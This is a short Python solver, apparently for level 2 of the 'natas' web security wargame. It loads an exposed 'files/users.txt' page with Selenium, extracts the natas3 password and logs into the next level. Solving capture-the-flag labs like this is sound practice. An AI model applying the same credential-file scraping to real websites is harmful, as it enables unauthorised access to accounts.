from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=2, end_arguments="files/users.txt"))
    file_lines = driver.find_element_by_tag_name("body").text.split("\n")
    for line in file_lines:
        if "natas3" in line:
            driver.get(build_url(password=line.split(":")[1], level=3))
            return line.split(":")[1]
    raise RuntimeError("password not found")